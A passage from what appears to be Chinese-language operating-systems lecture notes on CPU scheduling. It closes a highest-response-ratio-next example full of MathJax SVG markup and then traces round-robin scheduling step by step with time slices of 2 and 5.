182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>、<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.781ex" xmlns="http://www.w3.org/2000/svg" width="26.364ex" height="3.15ex" role="img" focusable="false" viewBox="0 -1047.1 11652.7 1392.1"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mn" transform="translate(675,-150) scale(0.707)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g></g><g data-mml-node="mo" transform="translate(1078.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1467.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">响</text></g><g data-mml-node="mi" transform="translate(2367.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">应</text></g><g data-mml-node="mi" transform="translate(3267.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">比</text></g><g data-mml-node="mo" transform="translate(4445.3,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mfrac" transform="translate(5501.1,0)"><g data-mml-node="mrow" transform="translate(220,516.8) scale(0.707)"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z"></path></g><g data-mml-node="mo" transform="translate(889,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(1667,0)"><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z"></path></g><g data-mml-node="mo" transform="translate(2167,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(2556,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mn" transform="translate(3334,0)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g></g><g data-mml-node="mn" transform="translate(1398.7,-345) scale(0.707)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g><rect width="2911" height="60" x="120" y="220"></rect></g><g data-mml-node="mo" transform="translate(8929.9,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(9985.7,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z" transform="translate(500,0)"></path><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z" transform="translate(778,0)"></path></g><g data-mml-node="mo" transform="translate(11263.7,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></p><p>8时刻(P3完成)：<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.781ex" xmlns="http://www.w3.org/2000/svg" width="26.364ex" height="3.15ex" role="img" focusable="false" viewBox="0 -1047.1 11652.7 1392.1"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mn" transform="translate(675,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(1078.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1467.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">响</text></g><g data-mml-node="mi" transform="translate(2367.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">应</text></g><g data-mml-node="mi" transform="translate(3267.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">比</text></g><g data-mml-node="mo" transform="translate(4445.3,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mfrac" transform="translate(5501.1,0)"><g data-mml-node="mrow" transform="translate(220,516.8) scale(0.707)"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="38" d="M70 417T70 494T124 618T248 666Q319 666 374 624T429 515Q429 485 418 459T392 417T361 389T335 371T324 363L338 354Q352 344 366 334T382 323Q457 264 457 174Q457 95 399 37T249 -22Q159 -22 101 29T43 155Q43 263 172 335L154 348Q133 361 127 368Q70 417 70 494ZM286 386L292 390Q298 394 301 396T311 403T323 413T334 425T345 438T355 454T364 471T369 491T371 513Q371 556 342 586T275 624Q268 625 242 625Q201 625 165 599T128 534Q128 511 141 492T167 463T217 431Q224 426 228 424L286 386ZM250 21Q308 21 350 55T392 137Q392 154 387 169T375 194T353 216T330 234T301 253T274 270Q260 279 244 289T218 306L210 311Q204 311 181 294T133 239T107 157Q107 98 150 60T250 21Z"></path></g><g data-mml-node="mo" transform="translate(889,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(1667,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mo" transform="translate(2167,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(2556,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mn" transform="translate(3334,0)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g></g><g data-mml-node="mn" transform="translate(1398.7,-345) scale(0.707)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g><rect width="2911" height="60" x="120" y="220"></rect></g><g data-mml-node="mo" transform="translate(8929.9,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(9985.7,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z" transform="translate(500,0)"></path><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z" transform="translate(778,0)"></path></g><g data-mml-node="mo" transform="translate(11263.7,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>、<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.781ex" xmlns="http://www.w3.org/2000/svg" width="27.495ex" height="3.15ex" role="img" focusable="false" viewBox="0 -1047.1 12152.7 1392.1"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mn" transform="translate(675,-150) scale(0.707)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g></g><g data-mml-node="mo" transform="translate(1078.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1467.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">响</text></g><g data-mml-node="mi" transform="translate(2367.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">应</text></g><g data-mml-node="mi" transform="translate(3267.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">比</text></g><g data-mml-node="mo" transform="translate(4445.3,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mfrac" transform="translate(5501.1,0)"><g data-mml-node="mrow" transform="translate(220,516.8) scale(0.707)"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="38" d="M70 417T70 494T124 618T248 666Q319 666 374 624T429 515Q429 485 418 459T392 417T361 389T335 371T324 363L338 354Q352 344 366 334T382 323Q457 264 457 174Q457 95 399 37T249 -22Q159 -22 101 29T43 155Q43 263 172 335L154 348Q133 361 127 368Q70 417 70 494ZM286 386L292 390Q298 394 301 396T311 403T323 413T334 425T345 438T355 454T364 471T369 491T371 513Q371 556 342 586T275 624Q268 625 242 625Q201 625 165 599T128 534Q128 511 141 492T167 463T217 431Q224 426 228 424L286 386ZM250 21Q308 21 350 55T392 137Q392 154 387 169T375 194T353 216T330 234T301 253T274 270Q260 279 244 289T218 306L210 311Q204 311 181 294T133 239T107 157Q107 98 150 60T250 21Z"></path></g><g data-mml-node="mo" transform="translate(889,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(1667,0)"><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z"></path></g><g data-mml-node="mo" transform="translate(2167,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(2556,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mn" transform="translate(3334,0)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g></g><g data-mml-node="mn" transform="translate(1398.7,-345) scale(0.707)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g><rect width="2911" height="60" x="120" y="220"></rect></g><g data-mml-node="mo" transform="translate(8929.9,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(9985.7,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z" transform="translate(500,0)"></path><path data-c="37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z" transform="translate(778,0)"></path><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z" transform="translate(1278,0)"></path></g><g data-mml-node="mo" transform="translate(11763.7,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></p><p>12时刻(P2完成)：就绪队列中只剩下<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.339ex" xmlns="http://www.w3.org/2000/svg" width="2.44ex" height="1.885ex" role="img" focusable="false" viewBox="0 -683 1078.6 833"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mn" transform="translate(675,-150) scale(0.707)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g></g></g></g></svg></mjx-container></p><p>16时刻(P4完成)</p><h4 id="2-8-7-4-时间片轮转调度算法-RR"><a href="#2-8-7-4-时间片轮转调度算法-RR" class="headerlink" title="2.8.7.4 时间片轮转调度算法(RR)"></a>2.8.7.4 时间片轮转调度算法(RR)</h4><p>算法思想：公平地、轮流地为各个进程服务，让每个进程在一定时间间隔内都可以得到响应</p><p>算法规则：按照各进程到达就绪队列的顺序，轮流让各个进程执行一个时间片。若进程未在一个时间片内执行完，则剥夺处理机，将进程重新放到就绪队列队尾重新排队</p><p>用于作业 / 进程调度：用于进程调度(只有作业放入内存建立了相应的进程后，才能被分配处理机时间片)</p><p>是否可抢占：若进程未能在时间片内运行完，将被强行剥夺处理机使用权，因此时间片轮转调度算法属于抢占式的算法。由时钟装置发出时钟中断来通知CPU时间片已到</p><p>优点：公平、响应快，适用于分时操作系统</p><p>缺点：由于高频率的进程切换，因此有一定开销，不区分任务的紧急程度</p><p>是否会导致饥饿：不会</p><p>例：各进程到达就绪队列的时间、需要的运行时间如下表所示。使用时间片轮转调度算法，分析时间片大小分别是2、5时的进程运行情况。</p><p><strong>时间片轮转常用于分时操作系统，更注重“响应时间”，因而此处不计算周转时间。</strong></p><div class="table-container"><table><thead><tr><th>进程</th><th>到达时间</th><th>运行时间</th></tr></thead><tbody><tr><td>P1</td><td>0</td><td>5</td></tr><tr><td>P2</td><td>2</td><td>4</td></tr><tr><td>P3</td><td>4</td><td>1</td></tr><tr><td>P4</td><td>5</td><td>6</td></tr></tbody></table></div><p><strong>时间片大小为2</strong>（注：以下括号内表示当前时刻就绪队列中的进程、进程的剩余运行时间）</p><p>0时刻(P1(5))：0时刻只有P1到达就绪队列，让P1上处理机运行一个时间片</p><p>2时刻(P2(4) -&gt; P1(3))：2时刻P2到达就绪队列，P1运行完一个时间片，被剥夺处理机，重新放到队尾。此时P2排在队头，因此让P2上处理机。（注意：2时刻，P1下处理机，同一时刻新进程P2到达，如果在题目中遇到这种情况，默认新到达的进程先进入就绪队列）</p><p>4时刻(P1(3) -&gt; P3(1) -&gt; P2(2))：4时刻P3到达，先插到就绪队尾，紧接着P2下处理机也插到队尾</p><p>5时刻(P3(1) -&gt; P2(2) -&gt; P4(6))：5时刻P4到达插到就绪队尾（注意：由于P1的时间片还没用完，因此暂时不调度。另外，此时P1处于运行态，并不在就绪队列中）</p><p>6时刻(P3(1) -&gt; P2(2) -&gt; P4(6) -&gt; P1(1))：6时刻，P1时间片用完，下处理机，重新放回就绪队尾，发生调度</p><p>7时刻(P2(2) -&gt; P4(6) -&gt; P1(1))：虽然P3的时间片没用完，但是由于P3只需运行1各单位的时间。运行完了会主动放弃处理机，因此也会发生调度。队头进程P2上处理机</p><p>9时刻(P4(6) -&gt; P1(1))：进程P2时间片用完，并刚好运行完，发生调度，P4上处理机</p><p>11时刻(P1(1) -&gt; P4(4))：P4时间片用完，重新回到就绪队列。P1上处理机</p><p>12时刻(P4(4))：P1运行完，主动放弃处理机，此时就绪队列中只剩P4，P4上处理机</p><p>14时刻()：就绪队列为空，因此让P4接着运行一个时间片</p><p>16时刻：所有进程运行结束</p><p><strong>时间片大小为5</strong></p><p>0时刻(P1(5))：只有P1到达，P1上处理机</p><p>2时刻(P2(4))：P2到达，但P1时间片尚未结束，因此暂不调度</p><p>4时刻(P2(4) -&gt; P3(1))：P3到达，但P1时间片尚未结束，因此暂不调度</p><p>5时刻(P2(4) -&gt; P3(1) -&gt; P4(6))：P4到达，同时P1运行结束。发生调度，P2上处理机</p><p>9时刻(P3(1) -&gt; 